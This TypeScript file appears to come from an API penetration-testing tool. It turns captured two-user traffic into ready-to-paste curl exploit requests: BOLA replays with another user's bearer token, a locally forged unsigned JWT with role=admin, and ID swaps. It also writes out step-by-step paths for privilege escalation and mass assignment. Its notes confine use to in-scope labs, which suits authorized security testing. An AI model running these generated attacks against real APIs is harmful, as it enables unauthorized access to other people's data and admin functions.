import type { AttackPath, CapturedRequest, Finding, JwtToken, ReplayItem, Workspace } from "./types.ts";
import { bearerOf } from "./loot.ts";
import { headerValue } from "./cookies.ts";
import { mintJwt } from "./jwt.ts";
import { pathIds } from "./ids.ts";

function sh(s: string): string {
  return `'${s.replace(/'/g, `'\\''`)}'`;
}

function curlGet(url: string, bearer?: string, cookie?: string): string {
  const parts = ["curl", "-sk", sh(url)];
  if (bearer) parts.splice(2, 0, "-H", sh(`Authorization: Bearer ${bearer}`));
  if (cookie) parts.splice(2, 0, "-H", sh(`Cookie: ${cookie}`));
  return parts.join(" ");
}

function rawHttp(method: string, url: string, bearer?: string, body?: string): string {
  let u: URL;
  try {
    u = new URL(url);
  } catch {
    return `${method} ${url}`;
  }
  const lines = [`${method} ${u.pathname}${u.search} HTTP/1.1`, `Host: ${u.host}`];
  if (bearer) lines.push(`Authorization: Bearer ${bearer}`);
  if (body) {
    lines.push("Content-Type: application/json", `Content-Length: ${body.length}`, "", body);
  } else lines.push("", "");
  return lines.join("\n");
}

export function buildReplays(ws: Pick<Workspace, "requests" | "jwts" | "graph" | "aLabel" | "bLabel">): ReplayItem[] {
  const out: ReplayItem[] = [];
  const aReqs = ws.requests.filter((r) => r.actor === "A");
  const bReqs = ws.requests.filter((r) => r.actor === "B");
  const bTok = bReqs.map(bearerOf).find(Boolean);
  const aTok = aReqs.map(bearerOf).find(Boolean);
  const bCookie = bReqs.map((r) => headerValue(r.requestHeaders, "cookie")).find(Boolean);

  const bola = ws.graph.edges.filter((e) => e.bola);
  for (const e of bola) {
    const sample = [...aReqs, ...bReqs].find((r) => `${r.method} ${r.path}` === e.via || e.via.endsWith(r.path));
    const url = sample?.url;
    if (!url || !bTok) continue;
    out.push({
      id: `replay-bola-${out.length}`,
      title: `BOLA · ${ws.bLabel} token on ${e.via}`,
      severity: "critical",
      note: "Paste into your interceptor against an in-scope lab. ClaimForge does not send it.",
      curl: curlGet(url, bTok, bCookie),
      raw: rawHttp(sample?.method ?? "GET", url, bTok),
    });
  }

  const noneJwt = ws.jwts.find((j) => (j.alg ?? "").toLowerCase() === "none" || j.issues.some((i) => i.includes("none")));
  if (noneJwt) {
    const admin = mintJwt({ alg: "none", typ: "JWT" }, { ...noneJwt.payload, role: "admin", is_admin: true });
    const hostReq = [...aReqs, ...bReqs].find((r) => r.path.includes("/admin") || r.template.includes("/me")) ?? aReqs[0];
    if (hostReq) {
      const adminUrl = hostReq.origin ? `${hostReq.origin}${hostReq.path.startsWith("/admin") ? hostReq.path : "/api/admin/users"}` : hostReq.url;
      out.push({
        id: "replay-none-admin",
        title: "Unsigned JWT · role=admin (forged locally)",
        severity: "high",
        note: "Generated here. Replay only in a lab proxy you control.",
        curl: curlGet(adminUrl, admin),
        raw: rawHttp("GET", adminUrl, admin),
      });
    }
  }

  const swap = interestingSwap(aReqs, bReqs, bTok);
  if (swap) out.push(swap);

  return dedupeReplays(out);
}

function interestingSwap(aReqs: CapturedRequest[], bReqs: CapturedRequest[], bTok?: string): ReplayItem | null {
  if (!bTok) return null;
  const aObj = aReqs.find((r) => pathIds(r.path).length && r.status >= 200 && r.status < 300 && r.method === "GET");
  if (!aObj) return null;
  const already = bReqs.some((r) => r.path === aObj.path);
  if (already) return null;
  return {
    id: "replay-swap-id",
    title: `Hypothesis · swap ${wsPath(aObj)} onto B session`,
    severity: "medium",
    note: "B never hit this path in the capture. Test in-scope only.",
    curl: curlGet(aObj.url, bTok),
    raw: rawHttp("GET", aObj.url, bTok),
  };
}

function wsPath(r: CapturedRequest) {
  return `${r.method} ${r.path}`;
}

function dedupeReplays(items: ReplayItem[]): ReplayItem[] {
  const seen = new Set<string>();
  return items.filter((i) => {
    if (seen.has(i.curl)) return false;
    seen.add(i.curl);
    return true;
  });
}

export function buildPaths(ws: {
  findings: Finding[];
  jwts: JwtToken[];
  graph: Workspace["graph"];
  loot: Workspace["loot"];
  aLabel: string;
  bLabel: string;
  diffs: Workspace["diffs"];
}): AttackPath[] {
  const paths: AttackPath[] = [];
  const bolaF = ws.findings.filter((f) => /BOLA|Same-object/i.test(f.title));
  if (bolaF.length) {
    paths.push({
      id: "path-horizontal",
      title: `Horizontal access · ${ws.bLabel} reads ${ws.aLabel}'s objects`,
      objective: "Prove BOLA with two sessions and one object id.",
      findingIds: bolaF.map((f) => f.id),
      steps: [
        `Capture login for ${ws.aLabel} and ${ws.bLabel} (two HARs / Burp XML).`,
        "Open ID graph — red edges are foreign object reads.",
        `Copy the BOLA curl from Playbook ( ${ws.bLabel} bearer + ${ws.aLabel} object URL ).`,
        "Replay in your interceptor on the lab. Confirm foreign fields in the body.",
        "Report: missing object-level authorization on that template.",
      ],
    });
  }

  const jwtF = ws.findings.filter((f) => /alg is none|unsigned/i.test(f.why + f.title));
  if (jwtF.length) {
    paths.push({
      id: "path-jwt-none",
      title: "Unsigned JWT · claim tamper",
      objective: "Mint alg=none with elevated role and test admin routes in a lab proxy.",
      findingIds: jwtF.map((f) => f.id),
      steps: [
        "Open Forge, load the unsigned token.",
        "Preset: alg none + role admin.",
        "Copy the minted token. Do not send it from this app.",
        "In your proxy, replace Authorization on /api/admin/* and /api/me.",
        "If admin JSON returns, the API trusts client-signed tokens.",
      ],
    });
  }

  const mass = ws.loot.filter((l) => l.kind === "mass-assign");
  if (mass.length) {
    paths.push({
      id: "path-mass",
      title: "Mass assignment on write endpoints",
      objective: "Confirm whether role/price/userId in JSON is honored.",
      findingIds: [],
      steps: [
        "Loot lists write fields: role, admin, price, userId.",
        "In Repeater, flip one field at a time on an in-scope lab.",
        "Compare response to the original capture — did the object change owner or role?",
      ],
    });
  }

  const denied = ws.diffs.filter((d) => d.verdict === "denied");
  if (denied.length) {
    paths.push({
      id: "path-vertical",
      title: "Vertical — admin routes denied for B",
      objective: "Pair with JWT forge; 403 today is not 403 after claim tamper.",
      findingIds: [],
      steps: [
        ...denied.slice(0, 4).map((d) => `${d.method} ${d.template} denied for B — retry with forged admin JWT in the lab proxy.`),
      ],
    });
  }

  if (!paths.length) {
    paths.push({
      id: "path-recon",
      title: "Recon from capture",
      objective: "Two-role coverage of every template that returns an object id.",
      findingIds: [],
      steps: [
        "Loot → wordlist of ids/emails. Feed your fuzzer in the lab, not from here.",
        "Hit each Diff row as both actors.",
        "Re-import the new HARs and re-run the graph.",
      ],
    });
  }
  return paths;
}
